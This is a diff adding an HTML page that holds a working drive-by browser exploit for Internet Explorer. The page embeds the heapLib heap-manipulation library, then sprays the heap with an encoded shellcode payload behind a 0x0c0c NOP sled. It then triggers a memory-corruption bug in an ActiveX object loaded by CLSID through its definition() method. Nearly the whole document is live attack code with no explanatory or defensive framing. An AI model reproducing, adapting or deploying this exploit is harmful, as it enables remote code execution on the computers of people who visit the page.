@@ -1,0 +1,533 @@
+<html>
+<head>
+<script>
+//
+//   JavaScript Heap Exploitation library
+//   by Alexander Sotirov <asotirov@determina.com>
+//  
+//   Version 0.3
+//
+// Copyright (c) 2007, Alexander Sotirov
+// All rights reserved.
+// 
+// The HeapLib library is licensed under a BSD license, the text of which follows:
+// 
+// Redistribution and use in source and binary forms, with or without
+// modification, are permitted provided that the following conditions
+// are met:
+// 
+// 1. Redistributions of source code must retain the above copyright
+//    notice, this list of conditions and the following disclaimer.
+// 2. Redistributions in binary form must reproduce the above copyright
+//    notice, this list of conditions and the following disclaimer in the
+//    documentation and/or other materials provided with the distribution.
+// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
+//    may be used to endorse or promote products derived from this software
+//    without specific prior written permission.
+// 
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
+// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+// POSSIBILITY OF SUCH DAMAGE.
+//
+ 
+//
+// heapLib namespace
+//
+
+function heapLib() {
+}
+
+
+//
+// heapLib class
+//
+
+// heapLib.ie constructor
+//
+// Creates a new heapLib API object for Internet Explorer. The maxAlloc
+// argument sets the maximum block size that can be allocated using the alloc()
+// function.
+//
+// Arguments:
+//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
+//    heapBase - base of the default process heap (defaults to 0x150000)
+//
+
+heapLib.ie = function(maxAlloc, heapBase) {
+
+this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
+this.heapBase = (heapBase ? heapBase : 0x150000);
+
+// Allocate a padding string that uses maxAlloc bytes
+this.paddingStr = "AAAA";
+
+for (;4 + this.paddingStr.length*2 + 2 < this.maxAlloc;) {
+    this.paddingStr += this.paddingStr;
+}
+
+// Create an array for storing references to allocated memory
+this.mem = new Array();
+
+// Call flushOleaut32() once to allocate the maximum size blocks
+this.flushOleaut32();
+}
+
+
+//
+// Outputs a debugging message in WinDbg. The msg argument must be a string
+// literal. Using string concatenation to build the message will result in heap
+// allocations.
+//
+// Arguments:
+//    msg - string to output
+//
+
+heapLib.ie.prototype.debug = function(msg) {
+void(Math.atan2(0xbabe, msg));
+}
+
+
+//
+// Enables or disables logging of heap operations in WinDbg.
+//
+// Arguments:
+//    enable - a boolean value, set to true to enable heap logging
+//
+
+heapLib.ie.prototype.debugHeap = function(enable) {
+
+if (enable == true)
+    void(Math.atan(0xbabe));
+else
+    void(Math.asin(0xbabe));
+}
+
+
+//
+// Triggers a breakpoint in the debugger.
+//
+
+heapLib.ie.prototype.debugBreak = function(msg) {
+void(Math.acos(0xbabe));
+}
+
+
+//
+// Returns a string of a specified length, up to the maximum allocation size
+// set in the heapLib.ie constructor. The string contains "A" characters.
+//
+// Arguments:
+//    len - length in characters
+//
+
+heapLib.ie.prototype.padding = function(len) {
+if (len > this.paddingStr.length)
+    throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";
+
+return this.paddingStr.substr(0, len);
+}
+
+
+//
+// Returns a number rounded up to a specified value.
+//
+// Arguments:
+//    num   - integer to round
+//    round - value to round to
+//
+
+heapLib.ie.prototype.round = function(num, round) {
+if (round == 0)
+    throw "Round argument cannot be 0";
+
+return parseInt((num + (round-1)) / round) * round;
+}
+
+
+//
+// Converts an integer to a hex string. This function uses the heap.
+//
+// Arguments:
+//    num   - integer to convert
+//    width - pad the output with zeros to a specified width (optional)
+//
+
+heapLib.ie.prototype.hex = function(num, width)
+{
+var digits = "0123456789ABCDEF";
+
+var hex = digits.substr(num & 0xF, 1);
+
+while (num > 0xF) {
+    num = num >>> 4;
+    hex = digits.substr(num & 0xF, 1) + hex;
+}
+
+var width = (width ? width : 0);
+
+while (hex.length < width)
+    hex = "0" + hex;
+
+return hex;
+}
+
+
+//
+// Convert a 32-bit address to a 4-byte string with the same representation in
+// memory. This function uses the heap.
+//
+// Arguments:
+//    addr - integer representation of the address
+//
+
+heapLib.ie.prototype.addr = function(addr) {
+return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
+}
+
+
+//
+// Allocates a block of a specified size with the OLEAUT32 alloc function.
+//
+// Arguments:
+//    arg - size of the new block in bytes, or a string to strdup
+//    tag - a tag identifying the memory block (optional)
+//
+
+heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {
+
+var size;
+
+// Calculate the allocation size
+if (typeof arg == "string" || arg instanceof String)
+    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
+else
+    size = arg;
+
+// Make sure that the size is valid
+if ((size & 0xf) != 0)
+    throw "Allocation size " + size + " must be a multiple of 16";
+
+// Create an array for this tag if doesn't already exist
+if (this.mem[tag] === undefined)
+    this.mem[tag] = new Array();
+
+if (typeof arg == "string" || arg instanceof String) {
+    // Allocate a new block with strdup of the string argument
+    this.mem[tag].push(arg.substr(0, arg.length));
+}
+else {
+    // Allocate the block
+    this.mem[tag].push(this.padding((arg-6)/2));
+}
+}
+
+
+//
+// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
+// allocator.
+//
+// Arguments:
+//    tag - a tag identifying the group of blocks to be freed
+//
+
+heapLib.ie.prototype.freeOleaut32 = function(tag) {
+
+delete this.mem[tag];
+
+// Run the garbage collector
+CollectGarbage();
+}
+
+
+//
+// The JScript interpreter uses the OLEAUT32 memory allocator for all string
+// allocations. This allocator stores freed blocks in a cache and reuses them
+// for later allocations. The cache consists of 4 bins, each storing up to 6
+// blocks. Each bin holds blocks of a certain size range:
+//
+//    0 - 32
+//    33 - 64
+//    65 - 256
+//    257 - 32768
+//
+// When a block is freed by the OLEAUT32 free function, it is stored in one of
+// the bins. If the bin is full, the smallest block in the bin is freed with
+// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
+// bytes are not cached and are freed directly.
+//
+// To flush the cache, we need to free 6 blocks of the maximum size for each
+// bin. The maximum size blocks will push out all smaller blocks from the
+// cache. Then we allocate the maximum size blocks again, leaving the cache
+// empty.
+//
+// You need to call this function once to allocate the maximum size blocks
+// before you can use it to flush the cache.
+//
+
+heapLib.ie.prototype.flushOleaut32 = function() {
+
+this.debug("Flushing the OLEAUT32 cache");
+
+// Free the maximum size blocks and push out all smaller blocks
+
+this.freeOleaut32("oleaut32");
+
+// Allocate the maximum sized blocks again, emptying the cache
+
+for (var i = 0; i < 6; i++) {
+    this.allocOleaut32(32, "oleaut32");
+    this.allocOleaut32(64, "oleaut32");
+    this.allocOleaut32(256, "oleaut32");
+    this.allocOleaut32(32768, "oleaut32");
+}
+}
+
+
+//
+// Allocates a block of a specified size with the system memory allocator. A
+// call to this function is equivalent to a call to HeapAlloc(). If the first
+// argument is a number, it specifies the size of the new block, which is
+// filled with "A" characters. If the argument is a string, its data is copied
+// into a new block of size arg.length * 2 + 6. In both cases the size of the
+// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
+//
+// Arguments:
+//    arg - size of the memory block in bytes, or a string to strdup
+//    tag - a tag identifying the memory block (optional)
+//
+
+heapLib.ie.prototype.alloc = function(arg, tag) {
+
+var size;
+
+// Calculate the allocation size
+if (typeof arg == "string" || arg instanceof String)
+    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
+else
+    size = arg;
+
+// Make sure that the size is valid
+if (size == 32 || size == 64 || size == 256 || size == 32768)
+    throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
+
+// Allocate the block with the OLEAUT32 allocator
+this.allocOleaut32(arg, tag);
+}
+
+
+//
+// Frees all memory blocks marked with a specific tag with the system memory
+// allocator. A call to this function is equivalent to a call to HeapFree().
+//
+// Arguments:
+//    tag - a tag identifying the group of blocks to be freed
+//
+
+heapLib.ie.prototype.free = function(tag) {
+
+// Free the blocks with the OLEAUT32 free function
+this.freeOleaut32(tag);
+
+// Flush the OLEAUT32 cache
+this.flushOleaut32();
+}
+
+
+//
+// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
+// function before before using alloc() and free().
+//
+
+heapLib.ie.prototype.gc = function() {
+
+this.debug("Running the garbage collector");
+CollectGarbage();
+
+this.flushOleaut32();
+}
+
+
+//
+// Adds blocks of the specified size to the free list and makes sure they are
+// not coalesced. The heap must be defragmented before calling this function.
+// If the size of the memory blocks is less than 1024, you have to make sure
+// that the lookaside is full.
+//
+// Arguments:
+//    arg    - size of the new block in bytes, or a string to strdup
+//    count  - how many free blocks to add to the list (defaults to 1)
+//
+
+heapLib.ie.prototype.freeList = function(arg, count) {
+
+var count = (count ? count : 1);
+
+for (var i = 0; i < count; i++) {
+    this.alloc(arg);
+    this.alloc(arg, "freeList");
+}
+this.alloc(arg);
+
+this.free("freeList");
+}
+
+
+//
+// Add blocks of the specified size to the lookaside. The lookaside must be
+// empty before calling this function.
+//
+// Arguments:
+//    arg    - size of the new block in bytes, or a string to strdup
+//    count  - how many blocks to add to the lookaside (defaults to 1)
+//
+
+heapLib.ie.prototype.lookaside = function(arg, count) {
+
+var size;
+
+// Calculate the allocation size
+if (typeof arg == "string" || arg instanceof String)
+    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
+else
+    size = arg;
+
+// Make sure that the size is valid
+if ((size & 0xf) != 0)
+    throw "Allocation size " + size + " must be a multiple of 16";
+
+if (size+8 >= 1024)
+    throw("Maximum lookaside block size is 1008 bytes");
+
+var count = (count ? count : 1);
+
+for (var i = 0; i < count; i++)
+    this.alloc(arg, "lookaside");
+
+this.free("lookaside");
+}
+
+
+//
+// Return the address of the head of the lookaside linked list for blocks of a
+// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
+//
+// Arguments:
+//    arg - size of the new block in bytes, or a string to strdup
+//
+
+heapLib.ie.prototype.lookasideAddr = function(arg)
+{
+var size;
+
+// Calculate the allocation size
+if (typeof arg == "string" || arg instanceof String)
+    size = 4 + arg.length*2 + 2;    // len + string data + null terminator
+else
+    size = arg;
+
+// Make sure that the size is valid
+if ((size & 0xf) != 0)
+    throw "Allocation size " + size + " must be a multiple of 16";
+
+if (size+8 >= 1024)
+    throw("Maximum lookaside block size is 1008 bytes");
+
+// The lookahead array starts at heapBase + 0x688. It contains a 48 byte
+// structure for each block size + header size in 8 byte increments.
+
+return this.heapBase + 0x688 + ((size+8)/8)*48;
+}
+
+
+//
+// Returns a fake vtable that contains shellcode. The caller should free the
+// vtable to the lookaside and use the address of the lookaside head as an
+// object pointer. When the vtable is used, the address of the object must be
+// in eax and the pointer to the vtable must be in ecx. Any virtual function
+// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
+// execution. This function uses the heap.
+//
+// Arguments:
+//    shellcode - shellcode string
+//    jmpecx    - address of a jmp ecx or equivalent instruction
+//    size      - size of the vtable to generate (defaults to 1008 bytes)
+//
+
+heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {
+
+var size = (size ? size : 1008);
+
+// Make sure the size is valid
+if ((size & 0xf) != 0)
+    throw "Vtable size " + size + " must be a multiple of 16";
+
+if (shellcode.length*2 > size-138)
+    throw("Maximum shellcode length is " + (size-138) + " bytes");
+
+// Build the fake vtable that will go on the lookaside list
+//
+// lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
+// 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes
+
+var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124
+
+for (var i = 0; i < 124/4; i++)
+    vtable += this.addr(jmpecx);
+
+// If the vtable is the only entry on the lookaside, the first 4 bytes will
+// be 00 00 00 00, which disassembles as two add [eax], al instructions.
+// The jmp ecx trampoline will jump back to the beginning of the vtable and
+// execute the add [eax], al instructions. We need to use two sub [eax], al
+// instructions to fix the heap.
+
+vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
+          shellcode + heap.padding((size-138)/2 - shellcode.length);
+
+return vtable;
+}
+
+var heap_obj = new heapLib.ie(0x20000);
+var code = unescape("%ud699%u9f99%u3790%u482f%u4899%u9342%u4e4a%u4093%u93fd%u41fc%u46f9%u4193%u4847%ufcfd%u9097%u41fc%u4342%uf94f%uf891%u434a%u493f%u46d6%ufc46%u4bfc%ud640%uf592%u2f3f%uf541%u3f9b%u4f46%u9690%u4b48%u494a%u4099%u9691%u9ff8%u4e3f%u4bfd%u9337%u9946%uf549%u9637%u913f%u9647%u40f8%uf543%u9696%u4e4e%u9349%u9796%ufd48%u4093%u2741%u91fd%u9b2f%ud62f%u41fd%u413f%u4b9b%u2fd6%uf542%u9127%u3f49%u4047%u983f%u3f4e%u9047%u9b3f%ud697%u41fc%ufdf8%uf847%u373f%ud699%uf94e%u9f92%u999f%u49f9%u462f%u4649%u404f%u9743%u48f9%u9942%u4b93%u4ffc%u3f4b%u924a%u9841%u42fc%u9092%u9bf8%u9127%u4e93%u9347%uf541%u4996%u499f%u462f%u924b%u9796%u9f49%u42d6%u46d6%u4840%u93d6%u474a%u494e%u9846%ufc98%u4940%u972f%u919f%u9690%u2f4f%u4a47%u4b97%ufc4b%u999b%u3f4a%u4292%u9fd6%u98d6%u434a%u9ff5%u2f43%u4a4a%u46f9%uf948%u4791%ud692%u4a4e%u37fd%ud64f%u484f%u42f5%u4337%u4398%ud69f%u963f%u3f48%u4948%u913f%ufc46%u37f9%u9f4b%ufc4a%u2ff5%u4a46%u274a%u97d6%u27fd%u434f%u91f8%u97f5%u4ff9%u4192%u9390%u4f4a%u47fc%ud6f5%u9947%u2f27%uf5d6%u964a%u9b4b%u4248%u9842%u9f48%u4efd%u3743%ud642%u914a%u9127%uf82f%uf9f9%uf899%u43d6%u9690%u9948%ud64a%u9740%u48f9%u4793%u9199%u40fd%u9248%u9f46%u464f%u4146%u4bf5%u9149%u9292%ufc4b%u4b92%u2799%u9b48%uf8d6%u9791%u98fd%u4242%u4796%u9741%ufc47%u49fc%u474b%u4846%u4b93%u9348%u973f%u982f%u4296%u4047%u4e99%u989b%u9097%uf5f8%u3f91%u9727%uf94a%u4637%u4048%u4792%u9946%u9046%uf997%ud691%u3799%u9047%u9349%ufd43%u4b46%u27d6%uf599%u9796%u90f8%u9bf9%ufc42%u4e41%uf548%u9892%u4891%u4637%u4940%u46fd%u4e3f%u4a3f%u4198%u939f%u4291%u9741%ud641%u4098%ufd97%u9341%u909f%ufd40%uf991%u4a4b%u4127%u4043%u9896%u4e4b%u9f40%u9b93%uf899%u98f9%u4f90%u494e%u9043%u482f%u4a93%u9bf9%u999f%u4397%u4748%u9f4b%u9b98%u4391%u41f5%u4847%u4743%u9340%uf543%uf598%u2ffc%uf94a%u9240%u90fc%u9f98%ud699%u4b93%u434e%u9698%u4198%u9947%u414e%uf893%u3742%u3741%uf891%u379b%u934b%u27fc%u9392%u4a9b%u4a9f%uf549%u2ff8%u4b98%uf92f%uf92f%u4842%u4237%u3740%u9091%u4e99%ufc4f%u419f%u2f4a%u4699%u4e43%u4346%u994b%u374e%u374f%u9f49%u46fc%u4227%u424f%u9741%u274a%u479f%ud648%uf52f%u423f%u432f%u374e%u9140%ud699%u413f%u969f%u2727%u3f4e%u3799%u9f91%u4097%u494b%u9342%u934f%u2f4b%u9146%u3f4a%uf898%u409b%u2f4b%u4627%ufd9f%u4727%u9b97%u464b%u9b3f%u4796%u9b91%u4f42%u4341%ud6f5%u92d6%u91d6%u4a43%u4297%u9b46%u994e%u4893%u4afc%u9890%u4a93%u46fd%u4b4b%ufc43%u2f4a%u3ff8%u9749%u3f96%uf599%ufdfd%u4a37%u4991%u43f9%u9149%u4e43%u973f%u96fc%u4799%uf948%u47d6%uf84e%uf837%ufd91%u9b27%ufc9f%u3f91%ucebd%u7ca8%udafd%ud9c7%u2474%u5af4%uc931%u31b1%u6a31%u8313%u04c2%u6a03%u4ac1%u0189%u0835%ufa72%u6dc5%u1ffa%uadf4%u5498%u1da6%u39ea%ud54a%ua9be%u9bd9%udd16%u116a%ud041%u0a6b%u73b1%u51ef%u53e6%u99ce%u92fb%uc717%uc7f6%u83c0%uf7a5%ud965%u7375%ucf35%u60fd%uee8d%u372c%ua886%ub9ee%uc14b%ua1a6%uec88%u5971%u9a7a%u8b83%u63b3%uf22f%u967c%u3231%u49ba%u4a44%uf4b9%u895f%u22c0%u0ad5%ua062%uf74d%u6593%u7c0b%uc29f%uda5f%ud583%u508c%u5ebf%ub733%u2436%u1310%ufe13%u0239%u51f9%u5445%u0ea2%u1ee3%u5a4e%u7c9e%u9d04%ufb2c%u9d6a%u042e%uf6da%u8f1f%u81b5%u5a9f%u6ef2%u4f42%u070e%u1adb%u4ab3%uf0dc%u72f7%uf15f%u8087%u707f%ucd82%u68c7%u5efe%u8ea2%u5fad%uece7%ucc30%udd6b%u74d7%u2109");
+var YotGODwkqtZRHlVAMxThcViNAzJy = "%u0c0c%u0c0c";
+var nops = unescape(YotGODwkqtZRHlVAMxThcViNAzJy);
+
+while (nops.length < 0x80000) nops += nops;
+
+var offset = nops.substring(0, 0x100);
+var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
+
+while (shellcode.length < 0x40000) shellcode += shellcode;
+var block = shellcode.substring(0, (0x80000-6)/2);
+
+
+heap_obj.gc();
+for (var z=1; z < 0x230; z++) {
+  heap_obj.alloc(block);
+}
+
+
+</script>
+</head>
+<body>
+<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="klIy"></object>
+<script>
+var obj = document.getElementById('klIy').object;
+var src = unescape("%u0c08%u0c0c");
+while (src.length < 0x1002) src += src;
+src = "\\\\xxx" + src;
+src = src.substr(0, 0x1000 - 10);
+var pic = document.createElement("img");
+pic.src = src;
+pic.nameProp;
+obj.definition(79);
+</script>
+</body>
+</html>
